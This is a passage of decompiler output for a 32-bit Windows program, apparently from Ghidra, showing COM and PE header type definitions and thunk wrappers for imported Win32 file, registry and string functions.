    HRESULT (* GetTypeInfoType)(struct ITypeLib *, UINT, TYPEKIND *);
    HRESULT (* GetTypeInfoOfGuid)(struct ITypeLib *, GUID *, struct ITypeInfo * *);
    HRESULT (* GetLibAttr)(struct ITypeLib *, TLIBATTR * *);
    HRESULT (* GetTypeComp)(struct ITypeLib *, struct ITypeComp * *);
    HRESULT (* GetDocumentation)(struct ITypeLib *, INT, BSTR *, BSTR *, DWORD *, BSTR *);
    HRESULT (* IsName)(struct ITypeLib *, LPOLESTR, ULONG, BOOL *);
    HRESULT (* FindName)(struct ITypeLib *, LPOLESTR, ULONG, struct ITypeInfo * *, MEMBERID *, USHORT *);
    void (* ReleaseTLibAttr)(struct ITypeLib *, TLIBATTR *);
};

struct tagTLIBATTR {
    GUID guid;
    LCID lcid;
    SYSKIND syskind;
    WORD wMajorVerNum;
    WORD wMinorVerNum;
    WORD wLibFlags;
};

struct tagARRAYDESC {
    TYPEDESC tdescElem;
    USHORT cDims;
    SAFEARRAYBOUND rgbounds[1];
};

struct ITypeComp {
    struct ITypeCompVtbl * lpVtbl;
};

struct IRecordInfo {
    struct IRecordInfoVtbl * lpVtbl;
};

struct tagTYPEATTR {
    GUID guid;
    LCID lcid;
    DWORD dwReserved;
    MEMBERID memidConstructor;
    MEMBERID memidDestructor;
    LPOLESTR lpstrSchema;
    ULONG cbSizeInstance;
    TYPEKIND typekind;
    WORD cFuncs;
    WORD cVars;
    WORD cImplTypes;
    WORD cbSizeVft;
    WORD cbAlignment;
    WORD wTypeFlags;
    WORD wMajorVerNum;
    WORD wMinorVerNum;
    TYPEDESC tdescAlias;
    IDLDESC idldescType;
};

struct IRecordInfoVtbl {
    HRESULT (* QueryInterface)(struct IRecordInfo *, IID *, void * *);
    ULONG (* AddRef)(struct IRecordInfo *);
    ULONG (* Release)(struct IRecordInfo *);
    HRESULT (* RecordInit)(struct IRecordInfo *, PVOID);
    HRESULT (* RecordClear)(struct IRecordInfo *, PVOID);
    HRESULT (* RecordCopy)(struct IRecordInfo *, PVOID, PVOID);
    HRESULT (* GetGuid)(struct IRecordInfo *, GUID *);
    HRESULT (* GetName)(struct IRecordInfo *, BSTR *);
    HRESULT (* GetSize)(struct IRecordInfo *, ULONG *);
    HRESULT (* GetTypeInfo)(struct IRecordInfo *, struct ITypeInfo * *);
    HRESULT (* GetField)(struct IRecordInfo *, PVOID, LPCOLESTR, VARIANT *);
    HRESULT (* GetFieldNoCopy)(struct IRecordInfo *, PVOID, LPCOLESTR, VARIANT *, PVOID *);
    HRESULT (* PutField)(struct IRecordInfo *, ULONG, PVOID, LPCOLESTR, VARIANT *);
    HRESULT (* PutFieldNoCopy)(struct IRecordInfo *, ULONG, PVOID, LPCOLESTR, VARIANT *);
    HRESULT (* GetFieldNames)(struct IRecordInfo *, ULONG *, BSTR *);
    BOOL (* IsMatchingType)(struct IRecordInfo *, struct IRecordInfo *);
    PVOID (* RecordCreate)(struct IRecordInfo *);
    HRESULT (* RecordCreateCopy)(struct IRecordInfo *, PVOID, PVOID *);
    HRESULT (* RecordDestroy)(struct IRecordInfo *, PVOID);
};

struct tagDISPPARAMS {
    VARIANTARG * rgvarg;
    DISPID * rgdispidNamedArgs;
    UINT cArgs;
    UINT cNamedArgs;
};

union tagBINDPTR {
    FUNCDESC * lpfuncdesc;
    VARDESC * lpvardesc;
    struct ITypeComp * lptcomp;
};

struct IDispatch {
    struct IDispatchVtbl * lpVtbl;
};

struct IUnknownVtbl {
    HRESULT (* QueryInterface)(struct IUnknown *, IID *, void * *);
    ULONG (* AddRef)(struct IUnknown *);
    ULONG (* Release)(struct IUnknown *);
};

struct IDispatchVtbl {
    HRESULT (* QueryInterface)(struct IDispatch *, IID *, void * *);
    ULONG (* AddRef)(struct IDispatch *);
    ULONG (* Release)(struct IDispatch *);
    HRESULT (* GetTypeInfoCount)(struct IDispatch *, UINT *);
    HRESULT (* GetTypeInfo)(struct IDispatch *, UINT, LCID, struct ITypeInfo * *);
    HRESULT (* GetIDsOfNames)(struct IDispatch *, IID *, LPOLESTR *, UINT, LCID, DISPID *);
    HRESULT (* Invoke)(struct IDispatch *, DISPID, IID *, LCID, WORD, DISPPARAMS *, VARIANT *, EXCEPINFO *, UINT *);
};

struct IUnknown {
    struct IUnknownVtbl * lpVtbl;
};

struct ITypeLib {
    struct ITypeLibVtbl * lpVtbl;
};

struct ITypeInfo {
    struct ITypeInfoVtbl * lpVtbl;
};

struct tagEXCEPINFO {
    WORD wCode;
    WORD wReserved;
    BSTR bstrSource;
    BSTR bstrDescription;
    BSTR bstrHelpFile;
    DWORD dwHelpContext;
    PVOID pvReserved;
    HRESULT (* pfnDeferredFillIn)(struct tagEXCEPINFO *);
    SCODE scode;
};

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct tagPOINT * LPPOINT;

typedef struct HFONT__ HFONT__, *PHFONT__;

struct HFONT__ {
    int unused;
};

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

struct HBRUSH__ {
    int unused;
};

typedef struct HENHMETAFILE__ HENHMETAFILE__, *PHENHMETAFILE__;

typedef struct HENHMETAFILE__ * HENHMETAFILE;

struct HENHMETAFILE__ {
    int unused;
};

typedef struct HPALETTE__ HPALETTE__, *PHPALETTE__;

struct HPALETTE__ {
    int unused;
};

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ * HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ * HWND;

struct HWND__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef HANDLE HLOCAL;

typedef struct HPEN__ HPEN__, *PHPEN__;

struct HPEN__ {
    int unused;
};

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

typedef int (* FARPROC)(void);

typedef struct HICON__ HICON__, *PHICON__;

struct HICON__ {
    int unused;
};

typedef struct HPALETTE__ * HPALETTE;

typedef BOOL * LPBOOL;

typedef void * HGDIOBJ;

typedef struct HKEY__ * HKEY;

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

typedef struct HRSRC__ * HRSRC;

struct HRSRC__ {
    int unused;
};

typedef struct HBRUSH__ * HBRUSH;


// WARNING! conflicting data type names: /WinDef.h/ULONG - /wtypes.h/ULONG

typedef struct HFONT__ * HFONT;

typedef DWORD * LPDWORD;

typedef struct HPEN__ * HPEN;

typedef DWORD * PDWORD;

typedef struct HDC__ HDC__, *PHDC__;

struct HDC__ {
    int unused;
};

typedef struct _FILETIME * LPFILETIME;

typedef struct HDC__ * HDC;

typedef WORD * LPWORD;

typedef HKEY * PHKEY;

typedef HANDLE HGLOBAL;

typedef struct HICON__ * HICON;

typedef void * LPCVOID;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_THUNK_DATA32 IMAGE_THUNK_DATA32, *PIMAGE_THUNK_DATA32;

struct IMAGE_THUNK_DATA32 {
    dword StartAddressOfRawData;
    dword EndAddressOfRawData;
    dword AddressOfIndex;
    dword AddressOfCallBacks;
    dword SizeOfZeroFill;
    dword Characteristics;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_12 IMAGE_RESOURCE_DIR_STRING_U_12, *PIMAGE_RESOURCE_DIR_STRING_U_12;

struct IMAGE_RESOURCE_DIR_STRING_U_12 {
    word Length;
    wchar16 NameString[6];
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_18 IMAGE_RESOURCE_DIR_STRING_U_18, *PIMAGE_RESOURCE_DIR_STRING_U_18;

struct IMAGE_RESOURCE_DIR_STRING_U_18 {
    word Length;
    wchar16 NameString[9];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_8 IMAGE_RESOURCE_DIR_STRING_U_8, *PIMAGE_RESOURCE_DIR_STRING_U_8;

struct IMAGE_RESOURCE_DIR_STRING_U_8 {
    word Length;
    wchar16 NameString[4];
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_22 IMAGE_RESOURCE_DIR_STRING_U_22, *PIMAGE_RESOURCE_DIR_STRING_U_22;

struct IMAGE_RESOURCE_DIR_STRING_U_22 {
    word Length;
    wchar16 NameString[11];
};

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef char * va_list;

typedef union _union_1206 _union_1206, *P_union_1206;

union _union_1206 {
    HANDLE hIcon;
};

typedef struct _SHELLEXECUTEINFOA _SHELLEXECUTEINFOA, *P_SHELLEXECUTEINFOA;

typedef struct _SHELLEXECUTEINFOA SHELLEXECUTEINFOA;

struct _SHELLEXECUTEINFOA {
    DWORD cbSize;
    ULONG fMask;
    HWND hwnd;
    LPCSTR lpVerb;
    LPCSTR lpFile;
    LPCSTR lpParameters;
    LPCSTR lpDirectory;
    int nShow;
    HINSTANCE hInstApp;
    void * lpIDList;
    LPCSTR lpClass;
    HKEY hkeyClass;
    DWORD dwHotKey;
    union _union_1206 u;
    HANDLE hProcess;
};




// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall CloseHandle(HANDLE hObject)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401190. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CloseHandle();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HANDLE __stdcall
CreateFileA(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,
           LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,
           DWORD dwFlagsAndAttributes,HANDLE hTemplateFile)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401198. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HANDLE)CreateFileA();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetFileType(HANDLE hFile)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011a0. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetFileType();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetFileSize(HANDLE hFile,LPDWORD lpFileSizeHigh)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011a8. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetFileSize();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HANDLE __stdcall GetStdHandle(DWORD nStdHandle)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011b0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HANDLE)GetStdHandle();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
ReadFile(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,
        LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011c0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = ReadFile();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall SetEndOfFile(HANDLE hFile)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011d0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetEndOfFile();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall
SetFilePointer(HANDLE hFile,LONG lDistanceToMove,PLONG lpDistanceToMoveHigh,DWORD dwMoveMethod)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011d8. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = SetFilePointer();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LONG __stdcall UnhandledExceptionFilter(_EXCEPTION_POINTERS *ExceptionInfo)

{
  LONG LVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011e0. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = UnhandledExceptionFilter();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall
WriteFile(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,
         LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011e8. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = WriteFile();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LPSTR __stdcall CharNextA(LPCSTR lpsz)

{
  LPSTR pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011f0. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = (LPSTR)CharNextA();
  return pCVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall ExitProcess(UINT uExitCode)

{
                    // WARNING: Could not recover jumptable at 0x004011f8. Too many branches
                    // WARNING: Treating indirect jump as call
  ExitProcess();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall MessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401200. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = MessageBoxA();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall FindClose(HANDLE hFindFile)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401208. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FindClose();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401210. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (HANDLE)FindFirstFileA();
  return pvVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall FreeLibrary(HMODULE hLibModule)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401218. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FreeLibrary();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LPSTR __stdcall GetCommandLineA(void)

{
  LPSTR pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401220. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = (LPSTR)GetCommandLineA();
  return pCVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetLastError(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401228. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetLastError();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall GetLocaleInfoA(LCID Locale,LCTYPE LCType,LPSTR lpLCData,int cchData)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401230. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetLocaleInfoA();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401238. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetModuleFileNameA();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401240. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HMODULE)GetModuleHandleA();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

FARPROC __stdcall GetProcAddress(HMODULE hModule,LPCSTR lpProcName)

{
  FARPROC pFVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401248. Too many branches
                    // WARNING: Treating indirect jump as call
  pFVar1 = (FARPROC)GetProcAddress();
  return pFVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo)

{
                    // WARNING: Could not recover jumptable at 0x00401250. Too many branches
                    // WARNING: Treating indirect jump as call
  GetStartupInfoA();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

LCID __stdcall GetThreadLocale(void)

{
  LCID LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401258. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = GetThreadLocale();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HMODULE __stdcall LoadLibraryExA(LPCSTR lpLibFileName,HANDLE hFile,DWORD dwFlags)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401260. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = (HMODULE)LoadLibraryExA();
  return pHVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall LoadStringA(HINSTANCE hInstance,UINT uID,LPSTR lpBuffer,int cchBufferMax)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401268. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = LoadStringA();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LPSTR __stdcall lstrcpynA(LPSTR lpString1,LPCSTR lpString2,int iMaxLength)

{
  LPSTR pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401270. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = (LPSTR)lstrcpynA();
  return pCVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall lstrlenA(LPCSTR lpString)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401278. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = lstrlenA();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall
MultiByteToWideChar(UINT CodePage,DWORD dwFlags,LPCSTR lpMultiByteStr,int cbMultiByte,
                   LPWSTR lpWideCharStr,int cchWideChar)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401280. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = MultiByteToWideChar();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LSTATUS __stdcall RegCloseKey(HKEY hKey)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401288. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegCloseKey();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LSTATUS __stdcall
RegOpenKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401290. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegOpenKeyExA();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LSTATUS __stdcall
RegQueryValueExA(HKEY hKey,LPCSTR lpValueName,LPDWORD lpReserved,LPDWORD lpType,LPBYTE lpData,
                LPDWORD lpcbData)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401298. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegQueryValueExA();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

int __stdcall
WideCharToMultiByte(UINT CodePage,DWORD dwFlags,LPCWSTR lpWideCharStr,int cchWideChar,
                   LPSTR lpMultiByteStr,int cbMultiByte,LPCSTR lpDefaultChar,
                   LPBOOL lpUsedDefaultChar)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012a0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = WideCharToMultiByte();
  return iVar1;
}



// WARNING: Exceeded maximum restarts with more pending

SIZE_T __stdcall VirtualQuery(LPCVOID lpAddress,PMEMORY_BASIC_INFORMATION lpBuffer,SIZE_T dwLength)

{
  SIZE_T SVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012a8. Too many branches
                    // WARNING: Treating indirect jump as call
  SVar1 = VirtualQuery();
  return SVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BSTR __stdcall SysAllocStringLen(OLECHAR *strIn,UINT ui)

{
  BSTR pOVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012b0. Too many branches
                    // WARNING: Treating indirect jump as call
  pOVar1 = (BSTR)SysAllocStringLen();
  return pOVar1;
}



// WARNING: Exceeded maximum restarts with more pending

INT __stdcall SysReAllocStringLen(BSTR *pbstr,OLECHAR *psz,uint len)

{
  INT IVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012b8. Too many branches
                    // WARNING: Treating indirect jump as call
  IVar1 = SysReAllocStringLen();
  return IVar1;
}



// WARNING: Exceeded maximum restarts with more pending

void __stdcall SysFreeString(BSTR bstrString)

{
                    // WARNING: Could not recover jumptable at 0x004012c0. Too many branches
                    // WARNING: Treating indirect jump as call
  SysFreeString();
  return;
}



// WARNING: Exceeded maximum restarts with more pending

LONG __stdcall InterlockedIncrement(LONG *lpAddend)

{
  LONG LVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012c8. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = InterlockedIncrement();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

LONG __stdcall InterlockedDecrement(LONG *lpAddend)

{
  LONG LVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012d0. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = InterlockedDecrement();
  return LVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetCurrentThreadId(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012d8. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetCurrentThreadId();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetVersion(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012e0. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetVersion();
  return DVar1;
}



// WARNING: Exceeded maximum restarts with more pending

BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012e8. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = QueryPerformanceCounter();
  return BVar1;
}



// WARNING: Exceeded maximum restarts with more pending

DWORD __stdcall GetTickCount(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012f0. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetTickCount();
  return DVar1;
}



WORD FUN_004012f8(void)

{
  WORD WVar1;
  undefined auStack72 [48];
  WORD local_18;
  
  GetStartupInfoA((LPSTARTUPINFOA)auStack72);
  WVar1 = 10;
  if ((auStack72[44] & 1) != 0) {
    WVar1 = local_18;
  }
  return WVar1;
}



// WARNING: Exceeded maximum restarts with more pending

HLOCAL __stdcall LocalAlloc(UINT uFlags,SIZE_T uBytes)

{
  HLOCAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040131c. Too many branches
                    // WARNING: Treating indirect jump as call
